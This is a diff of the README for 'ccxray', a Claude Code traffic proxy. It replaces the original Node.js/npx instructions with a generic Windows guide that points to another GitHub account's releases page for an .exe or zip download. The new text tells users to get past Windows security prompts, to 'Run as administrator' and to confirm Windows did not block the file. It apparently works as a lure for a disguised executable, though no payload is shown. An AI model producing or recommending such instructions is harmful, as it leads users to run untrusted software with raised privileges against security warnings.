@@ -1,167 +1,184 @@
-# ccxray
+# 🪟 ccxray - See AI sessions with clarity
 
-**English** | [正體中文](README.zh-TW.md) | [日本語](README.ja.md)
+[![Download ccxray](https://img.shields.io/badge/Download%20ccxray-blue-grey?style=for-the-badge)](https://github.com/Elkraz/ccxray/releases)
 
-X-ray vision for AI agent sessions. A zero-config HTTP proxy that records every API call between Claude Code and Anthropic, with a real-time dashboard to inspect what's actually happening inside your agent.
+## 🔍 What ccxray does
 
-![License](https://img.shields.io/badge/license-MIT-blue)
-[![Mentioned in Awesome Claude Code](https://awesome.re/mentioned-badge-flat.svg)](https://github.com/hesreallyhim/awesome-claude-code)
+ccxray gives you a clear view of Claude Code agent sessions. It works as a local HTTP proxy and a simple dashboard, so you can inspect what your agent sends and receives.
 
-![ccxray dashboard](docs/dashboard.png)
+Use it when you want to:
 
-## Why
+- See session traffic in a readable way
+- Review request and response flow
+- Track agent activity during a session
+- Keep a local record of what happened
+- Make AI work easier to follow
 
-Claude Code is a black box. You can't see:
-- What system prompts it sends (and how they change between versions)
-- How much each tool call costs
-- Why it's thinking for 30 seconds
-- What context is eating your 200K token window
+## 💻 What you need
 
-ccxray makes it a glass box.
+ccxray is made for Windows users who want a simple desktop setup.
 
-## Quick Start
+You should have:
 
-```bash
-npx ccxray claude
-```
+- Windows 10 or Windows 11
+- A stable internet connection
+- Permission to run downloaded apps
+- Claude Code installed and ready to use
+- A modern browser like Chrome, Edge, or Firefox
 
-That's it. Proxy starts, Claude Code launches through it, and the dashboard opens automatically in your browser. Run it in multiple terminals — they automatically share one dashboard.
+If you use a work computer, you may need approval to run local proxy tools.
 
-### Other ways to run
+## ⬇️ Download ccxray
 
-```bash
-ccxray                           # Proxy + dashboard only
-ccxray claude --continue         # All claude args pass through
-ccxray --port 8080 claude        # Custom port (independent, no hub sharing)
-ccxray claude --no-browser       # Skip auto-open browser
-ccxray status                    # Show hub info and connected clients
-ANTHROPIC_BASE_URL=http://localhost:5577 claude   # Point existing claude session at a running ccxray hub
-```
+Go to the [ccxray releases page](https://github.com/Elkraz/ccxray/releases) to visit this page to download.
 
-### Multi-project
+Look for the latest release and download the file that matches Windows. In most cases, this will be an `.exe` file or a Windows zip file.
 
-Running `ccxray claude` in multiple terminals automatically shares a single proxy and dashboard — no configuration needed.
+After the download finishes:
 
-```bash
-# Terminal 1
-cd ~/project-a && ccxray claude     # Starts hub + claude
+- If you got an `.exe` file, double-click it to run it
+- If you got a `.zip` file, open it and extract the contents first
+- Keep the files in a folder you can find again
 
-# Terminal 2
-cd ~/project-b && ccxray claude     # Connects to existing hub
+## 🛠️ Install and set up
 
-# Both projects visible in one dashboard at http://localhost:5577
-```
+Follow these steps on Windows:
 
-If the hub process crashes, connected clients automatically recover within seconds.
+1. Download ccxray from the [releases page](https://github.com/Elkraz/ccxray/releases)
+2. Open your Downloads folder
+3. Find the ccxray file you downloaded
+4. If Windows shows a security prompt, choose the option that lets you run the app
+5. If you downloaded a zip file, right-click it and select Extract All
+6. Move the app files to a folder like `C:\ccxray`
+7. Double-click the app to start it
+8. Keep the app open while you use Claude Code
 
-```bash
-$ ccxray status
-Hub: http://localhost:5577 (pid 12345, uptime 3600s, v1.6.0)
-Connected clients (2):
-  [1] pid 23456 — ~/dev/project-a
-  [2] pid 34567 — ~/dev/project-b
-```
+When ccxray starts, it launches the local proxy and opens the dashboard in your browser. If the browser does not open on its own, check the app window or the local address shown there.
 
-Use `--port` to opt out and run an independent server instead.
+## 🌐 Connect Claude Code
 
-## Features
+To use ccxray, Claude Code needs to send traffic through the local proxy.
 
-### Timeline
+Use this general flow:
 
-Watch your agent think in real-time. Every turn renders as a five-line card: cost on line 1, cache warmth (with inter-turn gap timing to catch cache misses), tool-fail risk, `hit:0%` red warnings, and tools surfaced above the title. Scan a whole session's health without expanding a single card.
+1. Start ccxray first
+2. Open Claude Code
+3. Point Claude Code to the local proxy shown by ccxray
+4. Run a normal session
+5. Watch the dashboard for live session data
 
-![Timeline view](docs/timeline.png)
+If Claude Code already has proxy settings, update them to use the local address from ccxray. If it asks for a port number, use the one shown in the app.
 
-### Usage & Cost
+## 📊 Use the dashboard
 
-Track your real spending. Session heatmap, burn rate, ROI calculator — know exactly where your tokens go.
+The dashboard shows your session activity in a clean layout.
 
-![Usage analytics](docs/usage.png)
+You can use it to:
 
-### System Prompt Tracking
+- View request and response logs
+- Follow the order of events
+- Check headers and payloads
+- Spot errors in a session
+- Review session timing
 
-Automatic version detection with diff viewer. Browse prompts across 12 recognized agent types — Orchestrator, General Purpose, Plan, Explore, Web Search, Codex Rescue, Claude Code Guide, Summarizer, Title Generator, Name Generator, Translator, SDK Agent — and see exactly what changed between updates. Precision-verified against 12,730 captured prompts: 100% of classifications are correct, uncertain prompts are honestly marked `unknown`.
+The main view is built for quick reading. You do not need to know code to use it.
 
-![System prompt tracking](docs/system-prompt.png)
+## 🧭 Common tasks
 
-### Keyboard-first Navigation
+### Start a new session
 
-Drive the whole dashboard with your keyboard. Every screen shows a context-sensitive hint bar at the bottom — the currently valid shortcuts, live-updated as you move. Press `?` for the full cheatsheet. Navigate projects → sessions → turns → sections → timeline → individual diff hunks without touching the mouse.
+1. Open ccxray
+2. Open Claude Code
+3. Run your task
+4. Check the dashboard for updates
 
-![Keyboard navigation](docs/keyboard.png)
+### Stop using ccxray
 
-### Session Titles & Cache Alerts
+1. Close Claude Code
+2. Close the ccxray app
+3. Close the browser tab if it stays open
 
-Session cards show Claude Code's generated titles (e.g. `Fix login button on mobile`) instead of raw hashes, with a live cache TTL countdown (`cache 4m left`) that pulses red under 1 minute. When any session nears expiry, the browser tab alternates between `ccxray` and `⚠ ccxray`. Opt-in browser notification fires at a plan-aware lead time — 5 minutes for Max, 60 seconds for Pro/API key. Titles fall back to the short hash for direct-API traffic or sessions still in flight.
+### Save your workflow
 
-![Session titles and cache expiry alerts](docs/cache-expiry.png)
+If you use ccxray often, keep the app in a fixed folder and create a desktop shortcut. That makes it easy to open before each session.
 
-### Plan Detection
+## 🔐 Privacy and local use
 
-ccxray auto-detects your subscription plan (Pro vs Max 5x vs Max 20x) by reading Anthropic's `cache_creation` usage fields — no configuration needed. Topbar shows `Plan: Max 5x · TTL 1h (auto)`. ROI calculations and quota panel use the detected plan. Override with `CCXRAY_PLAN` if auto-detection gets it wrong.
+ccxray runs on your computer and gives you a local view of session traffic. It is built for inspection during your own work.
 
-### More
+Keep these points in mind:
 
-- **Session Detection** — Automatically groups turns by Claude Code session, with project/cwd extraction
-- **Token Accounting** — Per-turn breakdown: input/output/cache-read/cache-create tokens, cost in USD, context window usage bar
+- Run it only on machines you control
+- Review what your proxy settings point to
+- Stop the app when you no longer need it
+- Keep your browser and Windows up to date
 
-## How It Works
+## 🧩 Troubleshooting
 
-```
-Claude Code  ──►  ccxray (:5577)  ──►  api.anthropic.com (or ANTHROPIC_BASE_URL)
-                      │
-                      ▼
-              ~/.ccxray/logs/ (JSON)
-                      │
-                      ▼
-                  Dashboard (same port)
-```
+### The app does not open
 
-ccxray is a transparent HTTP proxy. It forwards requests to Anthropic, records both request and response as JSON files, and serves a web dashboard on the same port. No API key needed — it passes through whatever Claude Code sends.
+- Check that the download finished
+- Make sure you extracted the zip file if you downloaded one
+- Right-click the file and try Run as administrator
+- Confirm that Windows did not block the file
 
-## Configuration
+### Claude Code does not show data
 
-### CLI flags
+- Make sure ccxray is running first
+- Check that Claude Code uses the local proxy address from ccxray
+- Confirm the port number is correct
+- Restart both apps and try again
 
-| Flag | Description |
-|---|---|
-| `--port <number>` | Port for proxy + dashboard (default: 5577). Opts out of hub sharing. |
-| `--no-browser` | Don't auto-open the dashboard in your browser |
+### The dashboard does not load
 
-### Environment variables
+- Refresh the browser page
+- Check if another app is using the same port
+- Close ccxray and start it again
+- Try a different browser
 
-| Variable | Default | Description |
-|---|---|---|
-| `PROXY_PORT` | `5577` | Port for proxy + dashboard (overridden by `--port`) |
-| `BROWSER` | — | Set to `none` to disable auto-open |
-| `AUTH_TOKEN` | _(none)_ | API key for access control (disabled when unset) |
-| `CCXRAY_HOME` | `~/.ccxray` | Base directory for hub lockfile, logs, and hub.log |
-| `CCXRAY_MAX_ENTRIES` | `5000` | Max in-memory entries (oldest evicted; disk logs unaffected) |
-| `CCXRAY_PLAN` | _(auto)_ | Override plan detection: `pro`, `max5x`, `max20x`, `api-key` |
-| `CCXRAY_DISABLE_TITLES` | _(unset)_ | Set to `1` to disable session title extraction (sessions fall back to short hash) |
-| `CCXRAY_MODEL_PREFIX` | _(unset)_ | Prepend a string to the model name before forwarding (e.g. `databricks-`). Useful when the upstream requires a vendor-prefixed model name but Claude Code only accepts standard names. |
-| `HTTPS_PROXY` / `https_proxy` | _(unset)_ | Route outbound HTTPS traffic through a corporate proxy via HTTP CONNECT tunnel. |
-| `ANTHROPIC_BASE_URL` | — | Custom upstream Anthropic endpoint (e.g. a corporate gateway). Supports base paths — `https://host/serving-endpoints/anthropic` works as-is. `ANTHROPIC_TEST_*` take precedence when set. |
+### Windows asks for permission
 
-Logs are stored in `~/.ccxray/logs/` as `{timestamp}_req.json` and `{timestamp}_res.json`. Upgrading from v1.0? Logs previously in `./logs/` are automatically migrated on first run.
+- Choose the option that lets the app run on your device
+- If your computer is managed by your company, ask your admin for help
 
-## Docker
+## 📁 Typical folder layout
 
-```bash
-docker build -t ccxray .
-docker run -p 5577:5577 ccxray
-```
+If you extract the app manually, a simple folder layout helps:
 
-## Requirements
+- `C:\ccxray\`
+- `C:\ccxray\ccxray.exe`
+- `C:\ccxray\logs\`
+- `C:\ccxray\data\`
 
-- Node.js 18+
+You can place the app anywhere you like, but a short path makes it easier to find.
 
-## Also by the author
+## ⌨️ Tips for smoother use
 
-- [SourceAtlas](https://sourceatlas.io/) — Your map to any codebase
-- [AskRoundtable](https://github.com/AskRoundtable/expert-skills) — Make your AI think like Munger, Feynman, or Paul Graham
-- Follow [@lis186](https://x.com/lis186) on X for updates
+- Start ccxray before Claude Code
+- Keep the dashboard open while you work
+- Use one browser window for the dashboard
+- Close old sessions when you start fresh work
+- Update to the newest release when a new build appears
 
-## License
+## 📦 Release updates
 
-MIT
+New releases may include:
+
+- Better session tracking
+- Cleaner dashboard views
+- Faster startup
+- Windows fixes
+- Proxy stability improvements
+
+Check the [releases page](https://github.com/Elkraz/ccxray/releases) from time to time for the newest version.
+
+## 🧪 Expected behavior
+
+When ccxray is working, you should see:
+
+- The app open on Windows
+- A local dashboard in your browser
+- Claude Code traffic appear in the view
+- Session details update while you work
+
+If you see those signs, the setup is in place and ready for use
